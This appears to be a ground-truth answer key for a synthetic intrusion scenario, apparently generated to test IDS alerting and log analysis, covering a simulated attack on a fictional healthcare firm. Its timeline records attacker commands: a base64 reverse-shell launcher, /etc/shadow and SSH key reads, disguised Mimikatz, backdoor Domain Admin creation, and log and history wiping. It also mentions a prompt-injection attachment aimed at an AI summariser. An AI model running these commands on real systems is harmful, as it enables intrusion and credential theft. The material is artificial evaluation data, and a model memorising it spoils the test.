# Ground Truth: iteration-test-expanded-ids

**Scenario:** IDS-focused variant of the expanded EvidenceForge iteration-test scenario for fast
generate/evaluate/fix cycles. It preserves the original environment and attack narrative
while adding authored, transport-correlated IDS assertions, sensor-local filtering, and
deliberate no-alert cases for broad automated and LLM-as-a-judge quality evaluation.
Meridian Healthcare Solutions is a mid-size healthcare IT company providing EHR
integration services from a corporate HQ with an on-premises data center. The
storyline compresses an APT-style web-app intrusion, Linux and Windows lateral
movement, credential theft, domain compromise, C2, DNS tunneling, data staging,
exfiltration, email abuse, and cleanup into a 6-hour collection window while
preserving broad event-type and log-format coverage. This expanded variant adds
explicit on-prem email topology, SMTP routing, corpus-backed message bodies,
MIME artifacts, distribution groups, Bcc handling, STARTTLS visibility, ISP relay
egress, inbound/outbound/internal mail, explicit mailbox reads, rejected mail,
and deterministic background email traffic.


**Generated:** 2024-03-18 12:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **diego.ramirez** on **WS-DRAMIREZ-01**: External benefits-themed phishing message is delivered to Finance with hidden security Bcc
2. **diego.ramirez** on **WS-DRAMIREZ-01**: Finance user reads the suspicious benefits message through OWA
3. **diego.ramirez** on **WS-DRAMIREZ-01**: Diego forwards the suspicious message to the help desk and discreetly copies security
4. **root** on **WEB-EXT-01**: External attacker scans the DMZ for exposed services
5. **root** on **WEB-EXT-01**: External attacker runs Nikto web vulnerability scanning against the EHR portal
6. **root** on **LT-MRIVERA-02**: Rogue laptop obtains an address from DHCP on the corporate LAN
7. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an internal EHR release note to a clinical operations distribution group
8. **omar.haddad** on **WS-OHADDAD-01**: Analytics user reads the EHR release note through IMAPS
9. **apache** on **WEB-EXT-01**: SQL injection probes against the EHR portal produce server errors
10. **apache** on **WEB-EXT-01**: Web shell upload and reverse shell callback to direct-IP C2
11. **root** on **WEB-EXT-01**: Network and host discovery from the compromised web server
12. **priya.patel** on **WS-PPATEL-01**: A vendor document workflow sends security an AI-generated summary with prompt-injection text in an attachment
13. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an outbound interface package to a lab vendor through the clinical route and ISP relay
14. **root** on **WEB-EXT-01**: Harvest database credentials and SSH key material from the web server
15. **root** on **APP-INT-01**: Failed SSH attempt to PROXY-01 followed by successful SSH lateral movement to APP-INT-01
16. **root** on **APP-INT-01**: Dump Linux password databases from APP-INT-01
17. **marcus.chen** on **WS-MCHEN-01**: Attacker uses explicit sysadmin credentials through RunAs
18. **root** on **LT-MRIVERA-02**: Wrong-password fumble before broader credential spray
19. **root** on **WS-AJOHNSON-01**: Credential spray succeeds against help desk user followed by RDP session
20. **aisha.johnson** on **WS-AJOHNSON-01**: Compromised help desk mailbox sends an internal credential-reset lure to finance
21. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker reads the compromised help desk mailbox through IMAPS
22. **aisha.johnson** on **WS-AJOHNSON-01**: Active Directory enumeration from compromised workstation
23. **aisha.johnson** on **WS-AJOHNSON-01**: Credential dumping with Mimikatz disguised as a Windows indexing service
24. **aisha.johnson** on **DC-01**: PsExec-style lateral movement to DC-01 through SMB service creation
25. **evelyn.brooks** on **WS-EBROOKS-01**: External invoice-themed attachment is rejected by the mail gateway
26. **SYSTEM** on **DC-01**: Create backdoor account and add it to Domain Admins
27. **SYSTEM** on **DC-01**: Install service and scheduled task persistence on DC-01
28. **SYSTEM** on **DC-01**: Allowed HTTPS beacon from DC-01 to attacker infrastructure
29. **SYSTEM** on **DC-01**: Direct C2 beacon attempts from DC-01 are blocked by firewall
30. **root** on **APP-INT-01**: DNS tunneling exfiltration from APP-INT-01
31. **evelyn.brooks** on **WS-EBROOKS-01**: Executive sends an inline-authored operating note to an outside advisor with internal Bcc
32. **root** on **WEB-EXT-01**: DGA queries from compromised web server
33. **svc_mhsync** on **FILE-SRV-01**: Backdoor account authenticates to FILE-SRV-01 and stages sensitive data
34. **root** on **DB-PROD-01**: SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01
35. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker locks compromised workstation before stepping away
36. **aisha.johnson** on **WS-AJOHNSON-01**: Upload compressed archive to external staging domain over HTTPS
37. **root** on **WEB-EXT-01**: Ongoing periodic beacon from WEB-EXT-01
38. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker returns and unlocks compromised workstation
39. **root** on **WEB-EXT-01**: Clear Linux shell history on WEB-EXT-01
40. **root** on **APP-INT-01**: Clear Linux shell history on APP-INT-01
41. **SYSTEM** on **DC-01**: Encoded PowerShell download and Security log clearing on DC-01
42. **root** on **APP-INT-01**: Standalone DNS queries for attacker infrastructure
43. **SYSTEM** on **DC-01**: Delete backdoor account after exfiltration
44. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker logs off compromised help desk workstation
45. **svc_mhsync** on **FILE-SRV-01**: Backdoor account session logs off FILE-SRV-01
46. **root** on **APP-INT-01**: Root SSH session logs off APP-INT-01


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2024-03-18 12:12:17 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: notices@benefits-serviceportal.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Benefits confirmation required today' (artifacts/email/benefits-confirmation-msg.eml) |
| 2024-03-18 12:17:43 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Read | Mailbox read: diego.ramirez@meridianhcs.com via owa on finance (UID: CX54ItO0hUgddbaSbw) |
| 2024-03-18 12:23:58 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: diego.ramirez@meridianhcs.com -> aisha.johnson@meridianhcs.com, marcus.chen@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Fwd: Benefits confirmation required today' (artifacts/email/finance-forward-to-it-msg.eml) |
| 2024-03-18 12:30:25 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [22], 1 denied connections + ASA threat detection alert (733100) [IDS: SID 2002911 policy={'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=0 emitted=0 filtered=0] |
| 2024-03-18 12:30:25 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [80, 443, 8080, 8443, 3306], 5 denied connections + ASA threat detection alert (733100) |
| 2024-03-18 12:31:17 UTC | root | WEB-EXT-01 | Web_Scan | Web scan (nikto) against 10.10.3.10:443 (384 requests) |
| 2024-03-18 12:45:03 UTC | root | LT-MRIVERA-02 | Dhcp_Lease | DHCP lease for LT-MRIVERA-02 (MAC: DC:A6:32:44:91:7B) |
| 2024-03-18 12:48:00 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> lina.nguyen@meridianhcs.com, omar.haddad@meridianhcs.com, priya.patel@meridianhcs.com; subject 'EHR connector release notes' (artifacts/email/ehr-release-note-msg.eml) |
| 2024-03-18 12:52:53 UTC | omar.haddad | WS-OHADDAD-01 | Email_Read | Mailbox read: omar.haddad@meridianhcs.com via imaps on clinical (UID: C8b3FtYDPIJ794DjtLW) |
| 2024-03-18 12:59:35 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CA0CidTXH6FbjVP0zIF) |
| 2024-03-18 12:59:39 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CqqezstGw7f4kKyDnI) |
| 2024-03-18 13:19:36 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: C3jRZKRgkDuTx4rsku) |
| 2024-03-18 13:19:38 UTC | apache | WEB-EXT-01 | Process | Process: /bin/bash (PID: 581370) - `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L...` |
| 2024-03-18 13:19:40 UTC | apache | WEB-EXT-01 | Connection | Connection to 45.33.32.30:8443 (UID: CCj8rdDoKSZTQYiM3Y) |
| 2024-03-18 13:19:44 UTC | apache | WEB-EXT-01 | Raw | Web shell upload and reverse shell callback to direct-IP C2 |
| 2024-03-18 13:39:54 UTC | root | WEB-EXT-01 | Process | Process: /usr/sbin/ip (PID: 584369) - `ip addr show` |
| 2024-03-18 13:40:18 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584417) - `cat /etc/hosts` |
| 2024-03-18 13:40:38 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 586697) - `cat /etc/resolv.conf` |
| 2024-03-18 13:49:53 UTC | priya.patel | WS-PPATEL-01 | Email_Message | Email delivered: workspace@docflow-health.net -> priya.patel@meridianhcs.com; subject 'DocFlow summary package: vendor terms' (artifacts/email/docflow-ai-summary-msg.eml) |
| 2024-03-18 13:55:34 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> miles.avery@stonebridge-consultingllc.com, omar.haddad@meridianhcs.com; subject 'Stonebridge interface package comments' (artifacts/email/vendor-interface-package-msg.eml) |
| 2024-03-18 13:56:41 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/find (PID: 586846) - `find /opt/ehr -name '*credential*' -maxdepth 3` |
| 2024-03-18 13:57:54 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 587331) - `nmap -sn 10.10.2.0/24` |
| 2024-03-18 14:02:01 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 587456) - `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24` |
| 2024-03-18 14:03:10 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587483) - `cat /var/www/html/config.php` |
| 2024-03-18 14:03:14 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/ls (PID: 587609) - `ls -la /root/.ssh` |
| 2024-03-18 14:04:11 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587638) - `cat /root/.ssh/id_rsa` |
| 2024-03-18 14:14:50 UTC | root | APP-INT-01 | Connection | Connection to 10.10.3.20:22 (UID: Cq6i4QNFjnv0ZANkZF) |
| 2024-03-18 14:14:52 UTC | root | APP-INT-01 | Ssh_Session | SSH session to 10.10.2.30:22 (UID: CYGAkJWR55Mfv1EHIE) [IDS: SID 2002911 policy={'detection_filter': None, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=2 emitted=2 filtered=0] |
| 2024-03-18 14:34:39 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962109) - `cat /etc/passwd` |
| 2024-03-18 14:34:43 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962124) - `cat /etc/shadow` |
| 2024-03-18 14:50:24 UTC | marcus.chen | WS-MCHEN-01 | Explicit_Credentials | Explicit credentials: RunAs marcus.chen on DC-01 |
| 2024-03-18 14:59:27 UTC | root | LT-MRIVERA-02 | Failed_Logon | Wrong-password fumble before broader credential spray |
| 2024-03-18 14:59:46 UTC | root | WS-AJOHNSON-01 | Credential_Spray | Credential spray: 4 attempts against 3 accounts (success: aisha.johnson at attempt 4) |
| 2024-03-18 14:59:46 UTC | aisha.johnson | WS-AJOHNSON-01 | Rdp_Session | RDP session to 10.10.1.35:3389 (UID: CwOB7wtcHZV0P00QMQd) |
| 2024-03-18 15:07:43 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Message | Email delivered: aisha.johnson@meridianhcs.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, marcus.chen@meridianhcs.com; subject 'Help desk follow-up: credential reset validation' (artifacts/email/internal-reset-lure-msg.eml) |
| 2024-03-18 15:14:23 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Read | Mailbox read: aisha.johnson@meridianhcs.com via imaps on edge (UID: C7jyxybauNb1n9hdLH) |
| 2024-03-18 15:19:51 UTC | aisha.johnson | WS-AJOHNSON-01 | Logon | Network logon from 10.10.1.99 (LogonID: 0x27002a1) |
| 2024-03-18 15:19:53 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\whoami.exe (PID: 7048) - `whoami /all` |
| 2024-03-18 15:19:55 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 7068) - `net user /domain` |
| 2024-03-18 15:19:56 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 7072) - `net group "Domain Admins" /domain` |
| 2024-03-18 15:19:57 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 7096) - `net view /domain` |
| 2024-03-18 15:19:58 UTC | aisha.johnson | WS-AJOHNSON-01 | Dns_Query | DNS query: DC-01.meridianhcs.local (A, NOERROR) |
| 2024-03-18 15:19:59 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 10.10.2.10:389 (UID: CXoQJZZ2Mn5mQkqNRSO) |
| 2024-03-18 15:45:18 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\ms-index-service.exe (PID: 7128) - `ms-index-service.exe "privilege::debug" "sekurl...` |
| 2024-03-18 15:45:20 UTC | aisha.johnson | WS-AJOHNSON-01 | Process_Access | Credential dumping with Mimikatz disguised as a Windows indexing service |
| 2024-03-18 15:45:31 UTC | aisha.johnson | WS-AJOHNSON-01 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2024-03-18 16:00:02 UTC | aisha.johnson | DC-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0x5554577) |
| 2024-03-18 16:00:03 UTC | aisha.johnson | DC-01 | Service_Installed | Service installed: PSEXESVC (%SystemRoot%\PSEXESVC.exe) |
| 2024-03-18 16:00:06 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\PSEXESVC.exe (PID: 5492) - `PSEXESVC.exe -accepteula` |
| 2024-03-18 16:00:08 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 5504) - `cmd.exe /c whoami && hostname` |
| 2024-03-18 16:07:24 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email rejected: billing@medclaims-processing.net -> evelyn.brooks@meridianhcs.com; subject 'Updated claims processing invoice' (metadata-only) |
| 2024-03-18 16:14:37 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5516) - `net user svc_mhsync MhsSvc!2024 /add /domain` |
| 2024-03-18 16:14:49 UTC | SYSTEM | DC-01 | Account_Created | Account created: svc_mhsync |
| 2024-03-18 16:14:50 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5572) - `net group "Domain Admins" svc_mhsync /add /domain` |
| 2024-03-18 16:14:52 UTC | SYSTEM | DC-01 | Group_Member_Added | Added svc_mhsync to group Domain Admins |
| 2024-03-18 16:19:32 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 5584) - `sc.exe create DeviceSyncSvc binPath= C:\Windows...` |
| 2024-03-18 16:19:39 UTC | SYSTEM | DC-01 | Service_Installed | Service installed: DeviceSyncSvc (C:\Windows\System32\DeviceSyncSvc.exe) |
| 2024-03-18 16:19:48 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 5600) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2024-03-18 16:19:50 UTC | SYSTEM | DC-01 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\DeviceSync |
| 2024-03-18 16:29:56 UTC | SYSTEM | DC-01 | Beacon | Beacon to 45.33.32.30:443 (10 attempts, 1h30m) |
| 2024-03-18 16:31:10 UTC | SYSTEM | DC-01 | Beacon | Denied beacon to 45.33.32.30:443 (4 attempts, 1h30m) |
| 2024-03-18 16:44:41 UTC | root | APP-INT-01 | Dns_Tunnel | DNS tunnel via ns1.westbridge-services.cloud (hex, 248 queries, 1275 bytes exfiltrated) [IDS: SID 2029706 policy={'detection_filter': {'track': 'by_src', 'count': 10, 'seconds': 60}, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 2, 'seconds': 300}} candidates=247 emitted=6 filtered=241] |
| 2024-03-18 16:50:25 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email delivered: evelyn.brooks@meridianhcs.com -> marina.holt@northbridge-advisory.com, diego.ramirez@meridianhcs.com, priya.patel@meridianhcs.com; subject 'March operating note' (artifacts/email/executive-operating-note-msg.eml) |
| 2024-03-18 16:59:35 UTC | root | WEB-EXT-01 | Dga_Queries | DGA queries: 91 total (80 NXDOMAIN, TLD: .top, sample: ['ewnjsaqf1rasgez5.top', '6cja6syvo02mu.top', '30rgw6r7503.top']) [IDS: SID 2027865 policy={'detection_filter': {'track': 'by_src', 'count': 2, 'seconds': 120}, 'event_filter': {'type': 'both', 'track': 'by_src', 'count': 1, 'seconds': 300}} candidates=182 emitted=18 filtered=164] |
| 2024-03-18 17:01:11 UTC | svc_mhsync | FILE-SRV-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0xf8859f1) |
| 2024-03-18 17:01:11 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6116) - `net view \\FILE-SRV-01` |
| 2024-03-18 17:01:13 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 6120) - `powershell.exe -NoProfile -Command "Compress-Ar...` |
| 2024-03-18 17:15:08 UTC | root | DB-PROD-01 | Ssh_Session | SSH session to 10.10.4.10:22 (UID: CQZFpTHuAsPnWkGBUpN) |
| 2024-03-18 17:15:09 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/mysqldump (PID: 158463) - `mysqldump --single-transaction ehr patients ins...` |
| 2024-03-18 17:16:59 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/gzip (PID: 159666) - `gzip -9 /tmp/rpt_0318.sql` |
| 2024-03-18 17:19:58 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Lock | Workstation Locked |
| 2024-03-18 17:24:08 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/scp (PID: 160071) - `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/....` |
| 2024-03-18 17:25:07 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 45.33.32.30:443 (UID: Cf7DGHGZk1AgCK6UN6) |
| 2024-03-18 17:29:42 UTC | root | WEB-EXT-01 | Beacon | Beacon to 45.33.32.30:443 (3 attempts, count=3) |
| 2024-03-18 17:35:15 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Unlock | Workstation Unlocked |
| 2024-03-18 17:40:08 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/shred (PID: 608794) - `shred -u /root/.bash_history` |
| 2024-03-18 17:41:09 UTC | root | APP-INT-01 | Process | Process: /bin/bash (PID: 982876) - `history -c && cat /dev/null > ~/.bash_history` |
| 2024-03-18 17:41:58 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 5900) - `powershell.exe -NoProfile -EncodedCommand SQBFA...` |
| 2024-03-18 17:42:12 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 5940) - `wevtutil cl Security` |
| 2024-03-18 17:42:26 UTC | SYSTEM | DC-01 | Log_Cleared | Encoded PowerShell download and Security log clearing on DC-01 |
| 2024-03-18 17:45:07 UTC | root | APP-INT-01 | Dns_Query | DNS query: edge.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:45:07 UTC | root | APP-INT-01 | Dns_Query | DNS query: api.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:45:10 UTC | root | APP-INT-01 | Dns_Query | DNS query: metrics.westbridge-services.net (TXT, NXDOMAIN) |
| 2024-03-18 17:49:38 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5956) - `net user svc_mhsync /delete /domain` |
| 2024-03-18 17:49:42 UTC | SYSTEM | DC-01 | Account_Deleted | Account deleted: svc_mhsync |
| 2024-03-18 17:54:40 UTC | aisha.johnson | WS-AJOHNSON-01 | Logoff | Attacker logs off compromised help desk workstation |
| 2024-03-18 17:55:45 UTC | svc_mhsync | FILE-SRV-01 | Logoff | Backdoor account session logs off FILE-SRV-01 |
| 2024-03-18 17:57:18 UTC | root | APP-INT-01 | Logoff | Root SSH session logs off APP-INT-01 |


## Source Evidence Status

Canonical ground truth remains authoritative. Source rows may be `visible`, `delayed`, `dropped`, `filtered`, or `out_of_window` depending on the selected observation profile and sensor placement.

| Storyline ID | Source | Status Counts |
|--------------|--------|---------------|
| 020e6de8-32d6-4cef-8d7c-5d747ee7ec1d | ids | delayed: 1 |
| 037b9641-9800-4c7f-8b4b-f1c8fad04ded | ids | delayed: 1 |
| 03fd9869-e7b5-460f-954b-ad8e17e46e98 | ids | delayed: 2 |
| 04cec43f-bfed-4b58-9450-2714e1a619a3 | ids | delayed: 1 |
| 054a7000-e1ed-4e4e-9a35-160c0b639c1b | ids | delayed: 1 |
| 0609883d-9d93-4baf-b31b-a466dfb5a2bf | ids | delayed: 1 |
| 07ab1f2e-de29-4cf1-9823-9f11eeeb8bd5 | ids | delayed: 1 |
| 08a2c319-7ed5-4fdf-a7a7-c34e657caf28 | ids | delayed: 1 |
| 098c07a0-9624-4288-9523-d9bd6a155091 | ids | delayed: 1 |
| 0b2a01d8-fb6f-431b-b824-2b93b3bfdf6e | ids | delayed: 1 |
| 0b9e3598-ba64-4d06-99bb-dbfd7af2bf8d | ids | delayed: 1 |
| 0c07400d-c728-428d-b1f0-bae66ca83eb6 | ids | delayed: 2 |
| 0df390bf-9afe-432e-9191-b89df6875687 | ids | delayed: 1 |
| 1203d03e-3187-4dbb-8944-4dadfaff02d0 | ids | filtered: 1 |
| 125d7b3a-3a6f-4634-a56c-5e4978ac7ad6 | ids | delayed: 1 |
| 1575fd59-5dd5-4c89-ae0e-a2b1f7634afb | ids | delayed: 1 |
| 16bad131-51ac-4897-bba8-243b14b41875 | ids | delayed: 1 |
| 177fb28e-3dc5-4022-b874-93a363f8929c | ids | delayed: 1 |
| 17bad427-b938-46a2-bb93-8c730da010d9 | ids | delayed: 1 |
| 17c13056-be44-4c71-a634-f348bbf870f0 | ids | delayed: 1 |
| 1a0c7645-20d9-40f7-bcd9-5b72d5d93a86 | ids | delayed: 2 |
| 1d0fbf11-26d6-4491-9235-4f13d17190bb | ids | delayed: 1 |
| 1fc4ba9c-9f52-4753-baea-67a008e03040 | ids | delayed: 1 |
| 206ceb5f-0205-43c3-bdf3-1b17ea9a68b7 | ids | delayed: 1 |
| 23b5f126-9747-474c-98f3-f22456896612 | ids | delayed: 2 |
| 2bdba0ef-7906-453b-8468-d65a68f4325c | ids | delayed: 1 |
| 2c48e753-752c-4868-993d-6176258297fd | ids | delayed: 1 |
| 2c6aa66c-fa42-489f-994d-9524313ec62b | ids | delayed: 2 |
| 2c6ea9ad-85a0-4a1c-ba1f-9eae8ba02516 | ids | delayed: 2 |
| 2c9c22f0-f4b6-47b2-aafc-0aa2af6c4570 | ids | delayed: 1 |
| 2d1555fd-6d4d-45ce-a2ea-7d28c5aa15ce | ids | delayed: 1 |
| 2e149891-eb40-4afc-a392-9c2415c089d5 | ids | delayed: 1 |
| 302305a4-4eea-4411-ba7a-f83dea1945df | ids | delayed: 2 |
| 31acd216-e7a7-4cd9-8fec-2f196ba5f81e | ids | delayed: 1 |
| 3258fc33-79db-4339-9837-258ed2a01b48 | ids | delayed: 1 |
| 35b45019-4753-45eb-8576-ca2425598b9c | ids | delayed: 1 |
| 369d5ed3-07b6-49f4-828f-b75a13ab19c5 | ids | delayed: 2 |
| 38c7bb63-f44d-480d-a31e-98ea411b75ff | ids | delayed: 1 |
| 3907488d-a216-49b6-bbe1-c98f187d5442 | ids | delayed: 1 |
| 3b04ae1c-b88e-4a6c-8220-3060434fd837 | ids | delayed: 1 |
| 3b535e0f-3206-4c19-9268-16af3a092da9 | ids | delayed: 1 |
| 3e3ac35b-438d-4e6e-baad-a50bcc65e225 | ids | delayed: 1 |
| 3f461157-1c45-43bf-8a77-68a485a21d02 | ids | delayed: 1 |
| 4232c7d8-2fc3-47f0-97e8-2df30acff368 | ids | delayed: 1 |
| 480d401c-1250-458b-8c93-8cf8f835128e | ids | delayed: 1 |
| 4a3921a5-8f34-4ed3-94bb-9d70cc6ffaff | ids | delayed: 1 |
| 4d02c993-91f4-41d5-be04-ea463b95ba2a | ids | delayed: 1 |
| 536a7fe0-d3a0-49f7-a675-b9ac8f404e88 | ids | delayed: 1 |
| 5453da5b-0e14-481b-9595-38b70b417c23 | ids | delayed: 1 |
| 54a03057-7cb2-4bab-9b32-51814fd67062 | ids | delayed: 2 |
| 57250898-0310-4aea-97cf-c4ce2bb107b7 | ids | delayed: 2 |
| 58c56701-a909-494e-ba19-ec8302955110 | ids | delayed: 1 |
| 5a397d5e-0cf3-4562-b799-76958b0bb1aa | ids | delayed: 1 |
| 5b4373f7-0764-4005-856a-8155e8d2b7c8 | ids | delayed: 2 |
| 5bdbe510-fd31-4ed5-9e19-1c761b96655b | ids | delayed: 1 |
| 5cd45fcf-8616-4128-9b5c-58fb1a10fa1c | ids | delayed: 1 |
| 5e6a77de-41ac-433b-a420-8fe922244bfc | ids | delayed: 1 |
| 5f0cb5b8-51ea-46b9-80e8-0d10da72b15c | ids | delayed: 1 |
| 61948c60-e62d-4011-befa-4537635af517 | ids | delayed: 2 |
| 65de29e5-729f-485d-a194-60c0850ae9cc | ids | delayed: 1 |
| 66bde74b-a0cb-4eef-9a5f-1213dd59aef8 | ids | delayed: 2 |
| 6a044c15-b05e-4b4e-85a4-3dca4301a4b2 | ids | delayed: 1 |
| 887f5ee7-dcf0-4df3-a146-a0351b66deb3 | ids | delayed: 1 |
| 8b2f0c0f-ed11-4a4a-911e-430a419024e5 | ids | delayed: 1 |
| 9088587f-6846-4cde-8634-7be04ce9b86f | ids | delayed: 2 |
| 911b1a02-c571-4c82-852b-bd0fd5601aea | ids | delayed: 2 |
| 91e59eb6-a8c6-406b-8e2a-a456e5f9fe0a | ids | delayed: 2 |
| 925c8cb5-79fd-47d5-9bd3-755b18709835 | ids | delayed: 1 |
| 93057a55-f961-413c-8426-fb48106aead3 | ids | delayed: 1 |
| 936115ad-ea66-4b6c-8064-d3b5a1c6328e | ids | delayed: 1 |
| 9534c561-48b5-4dd7-866c-3cab29ab2610 | ids | delayed: 1 |
| 996258cf-fb80-441b-8803-6839aa399a04 | ids | delayed: 1 |
| 9a3fd6dc-e5bf-4ce0-a39c-101d0af1dc30 | ids | delayed: 1 |
| 9b5e1cd8-404b-40bf-a235-5967d501ea28 | ids | delayed: 1 |
| 9b604b9a-dcae-4c90-8e32-428740303a6b | ids | delayed: 1 |
| 9d9fe6cc-38cc-48e2-a60b-43855cf9312b | ids | delayed: 1 |
| 9f4dec51-5f5f-4380-91c6-380d291b4a0a | ids | delayed: 1 |
| a3743272-b779-4f4d-8e77-ce54aedf8ac4 | ids | delayed: 2 |
| a3bf5f75-307e-4395-8cf2-874b3a254b4f | ids | delayed: 1 |
| a5fee3d1-9942-4082-9ad3-a7dc2be11f5f | ids | delayed: 1 |
| ab3d4552-dfd7-43d9-b580-96f4345e0f3e | ids | delayed: 2 |
| af7316d1-df28-4b37-bf2a-de4c64f2379c | ids | delayed: 2 |
| b00a909c-9076-4c32-bfb7-eb11fc4e56cd | ids | delayed: 1 |
| b08ab1ef-7c5a-478a-a335-1d3926ccb574 | ids | delayed: 1 |
| b0afdba8-203f-4d80-a253-ac77d033eb4a | ids | delayed: 2 |
| b112c274-f5e7-4103-a1d8-197a3b1a06b9 | ids | delayed: 1 |
| b1260ca3-bd7a-4a14-94fa-336952343504 | ids | delayed: 1 |
| b19c7339-7bd9-4fa4-81a2-8cbd7fded862 | ids | delayed: 1 |
| b3e278f9-ce37-4536-96ee-317c5e943d5b | ids | visible: 1 |
| b6434724-013e-4fe3-ac33-dc1c5229fca4 | ids | delayed: 2 |
| b8072319-1406-4a15-b4f8-e7f479fb6e2d | ids | delayed: 1 |
| bcedcd09-b034-43eb-80c0-17cc6aab091f | ids | delayed: 1 |
| be2ae226-84b5-42c1-9915-11a75895c004 | ids | delayed: 2 |
| bf149e81-5181-4b3c-97fc-294fbf5938ec | ids | visible: 1 |
| c31746ab-16ed-426d-a255-9f126f976c38 | ids | delayed: 1 |
| c5ce2b72-0896-42fc-b6e3-e2e32f14a3d0 | ids | delayed: 1 |
| c7214b00-cc07-492d-a688-2de2469f8d39 | ids | delayed: 1 |
| c901f6a4-d518-427e-a1be-993bcdf68625 | ids | delayed: 1 |
| c99c03ff-b9e2-4121-94cc-09bff89e1b3c | ids | delayed: 1 |
| cbf0739e-5630-43e3-8f1a-2510cb4727c6 | ids | delayed: 1 |
| cc8dddd5-17e5-4d16-b0ab-2807e50437df | ids | delayed: 1 |
| cec4ac7e-e93e-46d5-be41-578f2ec3beb0 | ids | delayed: 2 |
| d0003932-b185-4510-975c-def1568e57a9 | ids | delayed: 1 |
| d0fc6358-07cc-4f65-8648-da1b9c588dee | ids | delayed: 2 |
| d399ce27-6c65-4ad5-9207-d68ef1d75c2c | ids | delayed: 2 |
| d679f532-fb74-471d-bbfd-0cb82585b456 | ids | delayed: 1 |
| dcd29910-2f36-4d6c-b54b-122a319f6b04 | ids | delayed: 1 |
| dda95b16-92b0-4c6a-b4ab-fbff556f850c | ids | delayed: 1 |
